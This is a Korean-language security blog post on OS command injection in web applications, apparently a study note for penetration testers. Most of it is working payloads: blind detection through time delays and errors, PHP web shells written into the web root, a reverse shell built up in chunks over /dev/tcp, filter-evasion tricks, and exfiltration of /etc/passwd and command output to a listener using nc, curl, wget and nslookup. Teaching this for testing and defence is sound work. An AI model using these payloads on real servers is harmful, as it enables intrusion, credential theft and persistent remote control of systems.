---
layout: single
title: Command Injection (OS Injection)
categories: Web-vuln
tag: [OS Injection, Command Injection, web, web vulnerability, injection]
toc: true
author_profile: false

---
# Command Injection이란?

> Command Injection이란 사용자의 입력값을 파라미터로 받아 서버측 백엔드에서 운영체제 명령으로 전달되어 명령을 실행하고 다시 반환될 때 발생하는 취약점으로 해당 취약점이 조재할 경 우 대상 서버를 완전히 제어 및 무력화 할 수 있는 치명적인 취약점이다.

# 공격 표면 

command injection의 경우 일반적으로 공격표면 즉 해당 취약점이 발생하는 구간을 찾기가 매우 어렵다.  예를 들어 아래와 같은 로직이 있다 생각해보자.

```
~/ViewPage/ViewText?textfilename=Test.txt

----------------------
exec('cat'+textfilename) 혹은 system('cat'+textfilename)
```

위와 같이 평범하게 filename 을 입력받아 출력 해주는 로직은 파일을 웹 서버단에 저장 후 일반적으로 출력해줄 수 있지만 위와 같이 시스템 명령어를 사용해 출력해주는 경우도 있다. 이와 같이 테스팅 과정에서 육안으로는 OS Injection 식별이 힘들다.

## OS 명령어의 인자 값으로 넘겨줄 때 자주 사용되는 파라미터

{% capture notice-2 %}  <!--notice-2 라는 변수에 다음 텍스트 문단을 문자열로 저장한다.-->  
#### 자주 사용되는 파라미터

* ?cmd={payload}
* ?exec={payload}
* ?command={payload}
* ?execute{payload}
* ?ping={payload}
* ?query={payload}
* ?jump={payload}
* ?code={payload}
* ?reg={payload}
* ?do={payload}
* ?func={payload}
* ?arg={payload}
* ?option={payload}
* ?load={payload}
* ?process={payload}
* ?step={payload}
* ?read={payload}
* ?function={payload}
* ?req={payload}
* ?feature={payload}
* ?exe={payload}
* ?module={payload}
* ?payload={payload}
* ?run={payload}
* ?print={payload}  <!--캡처 끝! 여기까지의 텍스트를 변수에 저장-->
{% endcapture %}

<div class="notice">
  {{ notice-2 | markdownify }} <!--div 태그 사이에 notice-2 객체를 출력하되 markdownify 한다. 즉 마크다운 화-->
</div>

위와 같은 파라미터를 통해 사용자의 입력값을 받는다면 이부분을 놓치지말고 한번은 테스팅을 해볼 필요가 있다.

```
?textfilename=test.txt;id;ls;whoami
```

위와 같이 리눅스 계열이라면 ; 명령어를 통해 추가 결과 값이 반환되는지에 대한 유무를 판단할 수 있다.  OS Injection에서는 메타문자를 사용하여, 원하고자하는 시스템 명령을 실행시킬 수 있다.

| 메타문자            | 기능                                                             | 사용 가능 OS     |
|---------------------|----------------------------------------------------------------|------------------|
| cmd1  cmd2`      | 왼쪽 명령의 결과를 오른쪽 명령의 입력으로 전달                    | *                |
| cmd1 && cmd2`      | 왼쪽 명령을 성공적으로 실행하면 오른쪽 명령을 실행                | *                |
| cmd1  cmd2`      | 왼쪽 명령의 실행에 실패하면 오른쪽 명령을 실행                    | *                |
| cmd1 ; cmd2`       | 한 줄에 여러 명령을 사용할 때 각각의 명령을 구분하기 위해 사용       | 리눅스/유닉스    |
| \`cmd\` , "cmd"  | 백틱(`) 사이의 명령을 실행한 결과를 반환                           | 리눅스/유닉스    |
| $(cmd)            | $() 안의 명령을 실행한 결과를 반환                                 | 리눅스/유닉스    |
| cmd > /your_file  | 왼쪽 명령의 결과를 오른쪽 파일에 기록                              | 리눅스/유닉스    |
| /your_file < cm`  | 오른쪽 명령의 결과를 왼쪽 파일에 기록                              | 리눅스/유닉스    |
| \n, 0x0a (줄바꿈) | 줄바꿈                                                            | 리눅스/유닉스    |
| cmd1; cmd2        | 여러 명령어를 동시에 사용                                          | 리눅스/유닉스    |


# Blind OS Command Injection

**<u style="color:red">보통 OS Injeciton의 경우 요청에 대한 응답값이 HTTP 응답 내에서 반환되지 않는 경우도 다수 존재한다. 이럴 경우 테스트 과정에서 놓치고 지나가는 경우가 있다.</u>**

<br>
그렇기에 Blind Command Injection 을 통해서 취약점 유무를 판별해야한다.

1. 시간지연
2. 출력 리다이렉트
3. 대역 외(out-of-band) 채널

<br>

윈도우 및 유닉스에 존재하는 ping 명령어를 사용하여 Response Time을 관찰하여 시스템 명령의 실행이 성공적으로 이루어졌는지에 대해 판별할 수 있다.

## 시간 지연을 통한 Blind OS Injection

<div class="notice--primary" markdown="1">

```
[윈도우]
?cmd=[입력값]& ping -i 2 -n 10 127.0.0.1 &
[리눅스/유닉스]
?cmd=[입력값]& ping -c 2 -i 10 127.0.0.1 &
?cmd=[입력값]& ping -c 2 -i 10 127.0.0.1; x || ping -n 10 127.0.0.1 &
``` 

- 위와 같이 지연시간을 통해 해당 OS Injection 취약점이 존재하는지에 대한 판별이 가능하다
- 혹은 500에러 (Internal Server Error)을 고의적으로 발생시켜 참과 거짓 여부를 판별할 수 있다.



```
id | base64 -w 0
```

- 위와 같이 공격자가 읟조한 명령어를 base64로 인코딩하여, 결과 값을 한 바이트씩 비교하여 참일 경우 SLEEP 명령어를 실행하도록 하는 방법이 존재한다.
- 예를 들면 아래와 같다.

```
bash -c "a=\$(id | base64 -w 0); if [ \$(a:0:1) == 'd' ]; then sleep 2; fi;"
```

- 이와 같이 시간지연이 불가능하거나 확인이 어려울 경우 에러를 고의적으로 발생시켜 base64로 인코딩 된 값을 1바이트씩 비교할 수 있다. 이 때 메모리 소모를 위해 internal Server Error를 발생시켜야 하며, cat /dev/urandom 명령어를 실행시킨다면 다량의 메모리를 소모시킬 수 있게된다.

```
bash -c "a=\$(id | base64 -w 0); if [ \&{a:0:1} == 'd' ]; then cat /dev/urandom; fi;"
```

- 이와 같이 코드가 참일 경우 cat /dev/uarndom이 실행되며, 500 에러를 유발한다.

</div>

## 출력 리다이렉트를 통한 Blind OS Injection

<div class="notice--primary" markdown="1">

```
?cmd=[입력값] & echo 'dected' > /var/www/html/dected.txt &
```

- echo 명령어 연계를 통해 웹루트 디렉터리 내에 dected.txt 파일 생성 후 dected 문자열을 삽입하게 된다. 이러한 방식을 통해 웹쉘 또한 출력 리다이렉트를 통해 업로드가 가능하다

```
echo '<?php system($_GET['cmd'])?.>' > /var/www/html/shell.php
```

> 이 경우 웹쉘 업로드시 웹 서버가 지정한 파일이 업로드 되는 경로를 알고있어야 한다.

- 보통 프레임워크 혹은 웹 어플리케이션에서는 Static File Directory를 사용한다.

<div class="notice">
  <h4>Static File Directory란 웹 서버에서 웹 페이지에 사용되는 정적 파일(HTML, CSS, JS, 이미지, 동영상 등)을 저장하는 디렉토리 이다.</h4>
</div>


</div>


해당 디렉터리에 실행한 명령어의 결과를 파일로 생성 후, 해당 파일에 접근하여 결과를 확인할 수 있다.
<br>
대표적으로 파이썬 언어에서 주로 사용되는 Flask 프레임워크 기본 설정의 경우 Static File Directory의 이름이 static로 설정되어 있다.
(해당 디렉터리를 사용하지 않는 환경이라도 static 디렉터리 생성 명령어를 실행하고 파일을 생성하면 된다.) 이 때 중요한 것은
**<u style="color:red;">프레임워크가 동작하는 디렉터리에 파일 생성 권한이 존재해야 한다.</u>**

```
mkdir static; id > static/result.txt
```

위와 같은 명령을 실행 후 static/result.txt 페이지에 접속하면 명령어 실행 결과를 확인할 수 있다.

## 입력 값 길이 제한 우회

간혹 입력 값 길이에 대한 제한이 있는 경우 Other에게도 읽기 권한과 쓰기 권한이 주어져 있는 "/tmp" 디렉터리에 임의의 파일을 생성 후 "bash < /dev/tcp/127.0.0.1/1234" 문자열 삽입 후 "bash </ tmp/[파일명]&" 명령어 실행시 앞서 생성한 파일을 bash를 통해 실행한다.

```
printf bas>/tmp/1
printf h>>/tmp/1
printf \<>>/tmp/1
printf /d>>/tmp/1
printf ev>>/tmp/1
printf /t>>/tmp/1
printf cp>>/tmp/1
printf />>/tmp/1
printf 1 >>/tmp/1
printf 2 >>/tmp/1
printf 7.>>/tmp/1
printf 0.>>/tmp/1
printf 0.>>/tmp/1
printf 1/>>/tmp/1
printf 1 >>/tmp/1
printf 2 >>/tmp/1
printf 3 >>/tmp/1
printf 4 >>/tmp/1
bash</tmp/1&
```

![그림 1-1](/assets/image/vuln/web-vuln/Command%20Injection/image.png)

> 단 명령어 중 숫자가 포함된 경우 Bash에서는 파일 디스크립터로 인식할 수 있기에, 띄어쓰기를 함께 삽입해주어야 한다.

## 대역 외 (Out-of-Bound) 채널을 통한 Blind OS Injection

> 대역 외 채널을 통한 방식은 네트워크의 인/아웃 바운드의 제한이 없는 경우 즉 공격 대상 서버의 네트워크 방화벽 규칙에 제한이 없어야 한다.

```
?cmd=[입력값] & nslookup 'Commands to be executed'.domain.com & 
```

nslookup 명령어를 통해 공격자가 소유하고 있는 도메인에 대한 도메인 조회를 발생시켜
<br>
공격자가 본인이 소유한 도메인 dns 조회 기록을 확인 후 해당 OS Injection 취약점 유무를 판별할 수 있다. 또한 위 방법과 같이 할 경우 ‘(벡틱) 사이에 명령어가 실행된다.

### curl 명령어를 사용한 Blind-Command Injection

```
curl -d http:domainaddress.com "$(cmd)"
```

### nc를 이용한 Blind-Command Injection

```
& cat secret.text | nc ip port
```

## Network Outbound

1. nc 를 이용한 reverser Shell (Telnet 동일)
- 특정 명령어를 넘겨준 후 \| (파이프라인)을 통해 공격자가 열어놓은 서버로 출력값을 전송할 수 있다.

```
& cat /etc/passwd | nc 127.0.0.1 3333
```

![그림 1-2](/assets/image/vuln/web-vuln/Command%20Injection/image-1.png)
- 공격자 서버에서 포트 개방

![그림 1-3](/assets/image/vuln/web-vuln/Command%20Injection/image-2.png)
- 시나리오 실습

![그림 1-4](/assets/image/vuln/web-vuln/Command%20Injection/image-3.png)
- 결과

```
$ cat /etc/passwd | telnet 127.0.0.1 3333
```

Telnet 또한 동일하게 사용이 가능하다.

> 이 때 127.0.0.1(loopback) 으로 설정한 이유는 본인 pc 에서 nc를 통해 서버를 열었으므로 루프백 주소를 한것이며, 실제 서버를 열었다면, 서버 ip 를 기입하여야 한다.

### CURL / WGET를 이용한 로그 전송

curl과 wget를 이용하여 웹 서버의 컨텐츠를 가져오기 위해 웹 서버에 접속할 경우 서버에서는 접속 로그를 남기게 된다. 이 특징을 이용하여, 웹 서버의 경로 혹은 Body 영역에 명령어의 실행 결과를 포함하여 전송하면 된다.

```
curl "http://127.0.0.1:8080/?$(ls -al|base64 -w0)"
```

Burp Swuit 혹은 owasp zap 같은 응용프로그램을 사용하여 OAST 기능을 사용하여도 가능하지만,
**<u style="color:red;">Pipedream과 같은 사이트를 이용해도 가능하다.</u>**

![그림 1-5](/assets/image/vuln/web-vuln/Command%20Injection/image-4.png)

사진과 같이 Base64로 인코딩 된 값이 get 요청의 파라미터로 전송 되는것을 확인할 수 있다.
이를 디코딩 할 경우 ls -al 의 결과가 출력된다.

<br>
위의 경우 GET 메서드를 통해 보내는 방식이며, POST를 사용할 경우 wget 및 curl을 아래와 같이
사용할 수 있다.

```
curl http://127.0.0.1:8080/ -d "$(ls -al)"
wget http://127.0.0.1:8080 --method=POST --body-data="`ls -al`"
```

이 외에도 nc를 이용해 이전 nc를 통한 방법과 동일하게 서버를 연 후
Bash에서 지원하는 기능을 사용하여 Reverse Shell또한 가능하다.

```
cat /etc/passwd > /dev/tcp/127.0.0.1[ip]/3333[port]
```

이 때 공격자 서버에서도 nc를 통해 포트개방을 해야한다.

```
nc -lvp 5252 -k -v
```

이 외에도 다양한 언어를 통한 리버스쉘 커넥션이 가능하다.

## OS Command Injection으로 인한 웹쉘 업로드

```
?cmd=127.0.0.1;printf '<?=system($_GET[0])?>' > /var/www/html/uploads/shell.php
```

> 여기서 /var/www/html 은 웹 루트디렉터리로의 접근을 위한 경로 설정이다.

## 강제 명령을 통한 시스템 명령어 실행

웹 페이지 내에 입력값을 시스템 명려어로 연계되어 실행하는 앤드포인트가 있다고 하여도, 해당 구간이, 필터링이 적절히 이루어져 있고, **<u style="color:red;">문자열로만 입력</ u>**받게되는 경우 강제 명령을 통해 문자열이 아닌 시스템 명령으로 변환할 수 있다.

```
echo `cat /etc/passwd`
echo $(cat /etc/passwd)
echo {cat,/etc/passwd}
```

위 명령어들은 echo 를 이용하여 문자열을 출력해주지만, 강제 명령을 통해 echo 를 통한 문자열이 아닌 cat /etc/passwd 명령어를 실행하게 된다.

## 특수 문자 제한에 대한 우회

OS Injection이 발생하는 취약한 환경에서 특수 문자가 제한 되는 경우가 있다. 이럴 경우 셸에서 제공하는 기능 혹은 환경 변수를 이용하여 우회가 가능하다.

### 공백일 경우

셸에서는 IFS(Internal Field Separator)이라는 환경 변수를 제공한다. 

> IFS란 문자열을 나눌 때 기준이 되는 문자를 정의하며 기본 값은 고백, 탭, 개행 순으로 정의 되어 있다.

```
cat${IFS}/etc/passwd
cat$IPS/etc/passwd
x=$'\x20';cat${x}/cat/passwd
x=$'\040';cat${x}/cat/passwd
{cat,/etc/passwd}
cat</etc/passwd
```

## 특정 키워드가 필터링 된 경우

cat 이라는키워드가 필터링 되었다고 가정하면 아래와 같이 우회가 가능하다.

```
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
c''a""t /etc/passwd
\c\a\t /etc/passwd
who``ami
c${invalid_variable}a${xx}t /etc/passwd
위 환경변수는 환경 변수의 값이 정의되어 있지 않고 비어있다면 공백으로 대체되기 때문이다.
```

혹은 특정 키워드가 필터링 될 경우 Hex, Oct, Dec 별 ASCII 변환을 통해 우회가 가능하다.

```
echo -e "\x69\x64" | sh #id
echo $'\151\144' | sh #id
x=$'\x69\x64'; sh -c $x #id
```

xxd 명령어를 통해 텍스트를 16진수 바이너리로 변환하여 명령어를 수행할 수도 있다.

```
cat `xxd -r -p <<< 2f6574632f706173737764` #/etc/passwd
```

### /etc/passwd 와 같이 경로명이 필터링 된경우 / 문자를 추가하면 된다.

```
c\at /etc////////passwd
```

## wget, curl 앤드포인트

OS Command Injection이 존재하는 구간에 사용되는 명령어가 wget, curl을 이용하는 경우
-o 옵션을 통해 웹쉘 업로드가 가능하다.

```
http://test.com?cmd=<?%3Dsystem($_GET[cmd]);?> -o /var/www/html/uploads/webshell.php
```

<hr>

# 리눅스와 윈도우의 차이
지금까지는 리눅스 계열에서의 관점으로 설명했다. 전체적인 틀은 똑같으나, 윈도우에서 사용하는
메타문자 및 명령어는 리눅스와의 차이가 있다. 이를 간단하게 알아보자.
윈도우의 경우 cmd 혹은 Powershell을 기반으로 설명한다.

| Linux                       | Windows                                | 설명                             |
|-----------------------------|----------------------------------------|---------------------------------|
| -a, --a (옵션)              | /c                                     | 커맨드 라인 옵션                |
| $PATH                       | $PATH$                                 | 환경 변수                        |
| $ABCD                       | $ABCD (Powershell only)                | 쉘 변수                          |
| ;                           | & (cmd only), ; (powershell only)      | 명령어 구분자                    |
| echo $(id)                  | for /f “delims=” %a in (’whoami’) do echo %a | 명령어 치환                  |
| > /dev/null                 | > nul (cmd only), \| Out-Null (powershell only) | 출력 제거                |
| command || true            | command & rem (cmd only), command -ErrorAction silentlycontinue (powershell cmdlet only) | 명령어 오류 무시 |

# 명령어의 차이

| Linux      | Windows    | 설명                  |
|------------|------------|----------------------|
| ls         | dir        | 디렉토리(폴더) 파일 목록 출력 |
| cat        | type       | 내용 출력              |
| cd         | cd         | 디렉토리(폴더) 이동   |
| rm         | del        | 파일 삭제             |
| cp         | copy       | 파일 복사             |
| ifconfig   | ipconfig   | 네트워크 설정         |
| env, export | set       | 환경변수 설정         |


# Referance
1. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command Injection
2. https://www.bugbountyclub.com/pentestgym/view/58
3. https://portswigger.net/web-security/os-command-injection
4. https://book.hacktricks.xyz/pentesting-web/command-injection
5. https://yolospacehacker.com/hackersguide/?cat=cmdinjection